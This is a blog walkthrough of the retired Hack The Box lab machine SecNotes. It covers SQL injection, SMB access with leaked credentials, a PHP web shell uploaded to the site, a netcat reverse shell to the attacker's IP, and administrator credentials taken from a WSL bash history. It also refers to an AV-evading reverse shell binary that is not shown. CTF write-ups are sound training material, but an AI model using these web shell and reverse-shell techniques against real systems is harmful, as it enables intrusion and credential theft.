---
published: false
layout: post
author: Jake
date: '2019-01-20 00:00:01 UTC'
tags: htb walkthrough SecNotes
---
This week we are taking a look at the retired Hack The Box machine [SecNotes](https://www.hackthebox.eu/home/machines/profile/151) (Medium difficulty)

We start off with our nmap scans:
```
root@kali: # Nmap 7.70 scan initiated Mon Aug 27 07:38:32 2018 as: nmap -sC -sV -oN nmap 10.10.10.97
Nmap scan report for 10.10.10.97
Host is up (0.79s latency).
Not shown: 998 filtered ports
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-title: Secure Notes - Login
|_Requested resource was login.php
445/tcp open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h19m55s, deviation: 4h02m32s, median: -5s
| smb-os-discovery: 
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: SECNOTES
|   NetBIOS computer name: SECNOTES\x00
|   Workgroup: HTB\x00
|_  System time: 2018-08-26T14:39:36-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2018-08-27 07:39:35
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Aug 27 07:40:17 2018 -- 1 IP address (1 host up) scanned in 105.00 seconds

root@kali: nmap -p- --max-retries 1 -Pn -T4 --oN nmap-allports 10.10.10.97
Nmap scan report for 10.10.10.97
Host is up (0.24s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
445/tcp  open  microsoft-ds
8808/tcp open  ssports-bcast

Nmap done: 1 IP address (1 host up) scanned in 248.38 seconds

```

Looks like we have a website running, so checking that out, we get presented with a website and login page:
![227573786.png]({{site.baseurl}}/Images/SecNotes/227573786.png)

Because we have a website, we always want some enumeration running in the background, so we run a gobuster in the background while we manually poke around at the site.
```
root@kali: gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 75 -u http://10.10.10.97 -o gobuster.log -x txt,html,php
=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.97/
[+] Threads      : 150
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : txt,php,html
[+] Timeout      : 10s
=====================================================
2019/01/19 10:48:56 Starting gobuster
=====================================================
/home.php (Status: 302)
/login.php (Status: 200)
/register.php (Status: 200)
/contact.php (Status: 302)
/Home.php (Status: 302)
/Contact.php (Status: 302)
/Login.php (Status: 200)
/logout.php (Status: 302)
/Register.php (Status: 200)
/HOME.php (Status: 302)
/Logout.php (Status: 302)
/CONTACT.php (Status: 302)
```

We have a couple of forms to work with, so we open up Burp to intercept the form requests and look for potential issues. Starting off with a login request, we save the request to a file called `login.req` and pass it to sqlmap to test for sql injection and let that run in the background:
```
root@kali: sqlmap -r login.req --level 5 --risk 3
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.3.1.40#dev}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

...
```

There is a link to sign up, so while sqlmap runs in the background, lets create a user and see if we can successfully log in to the site:
![227639350.png]({{site.baseurl}}/Images/SecNotes/227639350.png)

There is a lot functionality to test here, we try some basic sql inject the functionality of the website but do not get any hits:
![227541050.png]({{site.baseurl}}/Images/SecNotes/227541050.png)
![227672098.png]({{site.baseurl}}/Images/SecNotes/227672098.png)

We do see at the top of the page when we first logged on that there is at least a `tyler` user.. Maybe we can use the registration page to impersonate them with some crafted sql injection using a technique called Second Order Injection. 

> On stream we go into detail on the concepts of SQL Injection as well as the differences between standard SQL Injection and Second Order SQL Injection A link to the VOD will be placed here after the stream.

To prove the concept we try some basic sql injection on the registration page:
![227573824.png]({{site.baseurl}}/Images/SecNotes/227573824.png)

Here the password is just the text `password`

We attempt to log in with these details and see that we are allowed in, with a dump of all the notes in the database:
![227672109.png]({{site.baseurl}}/Images/SecNotes/227672109.png)

Looking at the new site note, we can see we have what looks like a network path and some credentials.
![227672123.png]({{site.baseurl}}/Images/SecNotes/227672123.png)

Because our nmap came back with SMB and this looks suspiciously like a network share address. We can quickly enumerate this with smbmap:
```
root@kali: smbmap -u tyler -p '92g!mA8BGjOirkL%OG*&' -H 10.10.10.97
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.97...
[+] IP: 10.10.10.97:445	Name: 10.10.10.97                                       
	Disk                                                  	Permissions
	----                                                  	-----------
	ADMIN$                                            	NO ACCESS
	C$                                                	NO ACCESS
	IPC$                                              	READ ONLY
	new-site                                          	READ, WRITE
```

We have read/write access to the box! Time to see whats there:
```
root@kali: smbclient \\\\10.10.10.97\\new-site -U tyler
Enter WORKGROUP\tyler's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Jan 19 12:00:44 2019
  ..                                  D        0  Sat Jan 19 12:00:44 2019
  iisstart.htm                        A      696  Fri Jun 22 01:26:03 2018
  iisstart.png                        A    98757  Fri Jun 22 01:26:03 2018

		12978687 blocks of size 4096. 8113721 blocks available
smb: \>
```

Looks like we have an IIS web root directory. But where is it? Looking back at our gobuster results to see if there was something we missed, but nothing comes up for port 80. We should also look back at our all port nmap scan to see if this IIS site is running on a different port. And we can see that it is running on port 8808.
![227704931.png]({{site.baseurl}}/Images/SecNotes/227704931.png)

We have write access to this directory, lets test if we can execute code by browsing to a page.

Try a bunch of different file extensions.. It's IIS so start with the default `.asp` and `.aspx`, but notice that they error out. `.html` pages appear to work as well as `.php`. So we go back to our trusty `cmd.php` web RCE script:
```
root@kali: cat cmd.php
<?php 
echo '<pre>';
echo system($_REQUEST['cmd']); 
echo '</pre>';
?>
```

Use smbclient to upload the file and browse to it with a test query string parameter:
![227639424.png]({{site.baseurl}}/Images/SecNotes/227639424.png)

This site runs as the tyler user, but the php shell can be improved. There are many many ways to turn a php based shell like this into a full reverse shell. Because we like to avoid MSF we are not going to demonstrate this.

One method that is just as easy is to put the `nc.exe` windows binary on the machine and use our php shell to create a real reverse shell using that exe:
```
root@kali: nc -nlvp 443

smb: \> put nc.exe

http://10.10.10.97:8808/cmd.php?cmd=nc.exe -e cmd.exe 10.10.14.10 443

root@kali: nc -nlvp 443       
Listening on [unknown] (family 0, port 1004545304)
Connection from 10.10.10.97 58408 received!
Microsoft Windows [Version 10.0.17134.228]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\inetpub\new-site>whoami
whoami
secnotes\tyler

C:\inetpub\new-site>

```

![227639464.png]({{site.baseurl}}/Images/SecNotes/227639464.png)

If the server has an AV running it could block us from being able to upload binaries like `nc.exe` or payloads generated with msfvenom. When that is the case we need to write our own reverse shell binary that will run on Windows. If we have no access to a Windows machine to write and compile such a binary we can still write and compile C and C++ applications on Linux using the mingw cross-compiler.

This is a sample persistent reverse shell binary that we have modified, that an AV will not know the signatures for and most likely not block: LINK TO GIST

Now that we are on the box as user, we can read the `user.txt` flag.

Moving on to root, as usual we start my looking at what is on the file system. 

Interestingly we see on the C:\ file system root directory that there is an ubuntu.zip file:
![227639469.png]({{site.baseurl}}/Images/SecNotes/227639469.png)

Back when we first got our shell we were given some system information in the banner. `Microsoft Windows [Version 10.0.17134.228]`. Looking up this banner we determine that this is a Windows 10 box from at least August 2018. Thinking back to around that time, Microsoft announced some new functionality to Windows 10 that allows you to install Linux as a subsystem to Windows (July 2018). Doing some research on this feature, we find out that by default the Linux subsystem is installed in a directory similar to: 
```
C:\Users\<username>\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState
```

We can easily look to see if Tyler has Ubuntu installed as a Linux subsystem by browsing there:
![227868688.png]({{site.baseurl}}/Images/SecNotes/227868688.png)

Looks like he does! As this is a CTF the subsystem has to be here for a reason. What if the `root.txt` flag is not in the Windows Administrator home directory, but actually in the Linux subsystems `/root` home? 

Going a few more folders deep we finally get to the actual `/` root of the Linux file system:
```
C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9CDD-BADA

 Directory of C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs

06/21/2018  05:03 PM    <DIR>          .
06/21/2018  05:03 PM    <DIR>          ..
06/21/2018  05:03 PM    <DIR>          bin
06/21/2018  05:00 PM    <DIR>          boot
06/21/2018  05:00 PM    <DIR>          dev
06/22/2018  02:00 AM    <DIR>          etc
06/21/2018  05:00 PM    <DIR>          home
01/18/2019  11:50 AM            87,944 init
06/21/2018  05:00 PM    <DIR>          lib
06/21/2018  05:00 PM    <DIR>          lib64
06/21/2018  05:00 PM    <DIR>          media
06/21/2018  05:03 PM    <DIR>          mnt
06/21/2018  05:00 PM    <DIR>          opt
06/21/2018  05:00 PM    <DIR>          proc
06/22/2018  01:44 PM    <DIR>          root
06/21/2018  05:00 PM    <DIR>          run
06/22/2018  01:57 AM    <DIR>          sbin
06/21/2018  05:00 PM    <DIR>          snap
06/21/2018  05:00 PM    <DIR>          srv
06/21/2018  05:00 PM    <DIR>          sys
06/22/2018  01:25 PM    <DIR>          tmp
06/21/2018  05:02 PM    <DIR>          usr
06/21/2018  05:03 PM    <DIR>          var
               1 File(s)         87,944 bytes
              22 Dir(s)  33,227,816,960 bytes free
```

Moving to where we would expect to find the `root.txt` flag if we were on a linux box. 
```
C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs\root>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9CDD-BADA

 Directory of C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs\root

06/22/2018  01:44 PM    <DIR>          .
06/22/2018  01:44 PM    <DIR>          ..
06/22/2018  02:09 AM             3,112 .bashrc
01/18/2019  11:56 AM               504 .bash_history
06/21/2018  05:00 PM               148 .profile
06/22/2018  01:56 AM    <DIR>          filesystem
               3 File(s)          3,764 bytes
               3 Dir(s)  33,227,816,960 bytes free
```

Hmm.. no `root.txt`, but there is a `.bash_history` with content in it, worth a quick look while we are here:
```
C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs\root>type .bash_history
type .bash_history
cd /mnt/c/
ls
cd Users/
cd /
cd ~
ls
pwd
mkdir filesystem
mount //127.0.0.1/c$ filesystem/
sudo apt install cifs-utils
mount //127.0.0.1/c$ filesystem/
mount //127.0.0.1/c$ filesystem/ -o user=administrator
cat /proc/filesystems
sudo modprobe cifs
smbclient
apt install smbclient
smbclient
smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
> .bash_history 
less .bash_history
exitls
whoami
cd /root
ls
ls -al
cat .bash_history
cd fsystem
ls
cd filesystem
ls
ls -al
cd ..
ls -al
ls
exit
```

Boom! We have some administrator credentials! Looks like the `root.txt` must have been on the Windows box all along. It also comes almost ready to go with the syntax we want to use! Just update the IP address and we should be on the box as Administrator and can read the `root.txt` flag:
```
root@kali: smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\10.10.10.97\\c$
Try "help" to get a list of possible commands.
smb: \>cd \users\administrator\desktop\
smb: \users\administrator\desktop\> dir
  .                                  DR        0  Mon Aug 20 03:01:17 2018
  ..                                 DR        0  Mon Aug 20 03:01:17 2018
  desktop.ini                       AHS      282  Mon Aug 20 03:01:17 2018
  Microsoft Edge.lnk                  A     1417  Sat Jun 23 09:45:06 2018
  root.txt                            A       34  Mon Aug 20 03:03:54 2018

		12978687 blocks of size 4096. 8112274 blocks available
```

We can't print the contents of the `root.txt` through smb.. but we can copy the file to our local machine and read it from there:
```
smb: \users\administrator\desktop\> get root.txt
getting file \users\administrator\desktop\root.txt of size 34 as root.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)\
...
root@kali: cat root.txt
7250c[REDACTED]83d447b
```


This was a great box for learning some basic SQL Injection as well as how in the same way that using a Linux Live or dual booting can read a complete windows file system regardless of the Windows permissions, Windows 10's new Linux subsystem allows the Windows user full access to the Linux file system, regardless of the Linux permissions. (So long as you have the necessary Windows permissions to read the `%APPDATA%` directory.







